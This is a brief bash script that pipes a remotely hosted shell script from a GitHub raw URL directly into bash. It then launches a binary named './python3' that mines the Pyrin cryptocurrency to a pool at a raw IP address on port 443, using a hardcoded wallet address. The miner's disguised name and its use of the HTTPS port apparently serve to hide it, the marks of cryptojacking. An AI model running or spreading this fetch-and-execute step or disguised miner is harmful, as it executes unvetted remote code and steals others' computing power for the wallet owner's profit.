#!/bin/bash

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"

cd dotlol

clear

./python3 -a PYRIN --pool stratum+tcp://64.23.180.137:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.$(shuf -n 1 -i 1-9999999) --no-cl
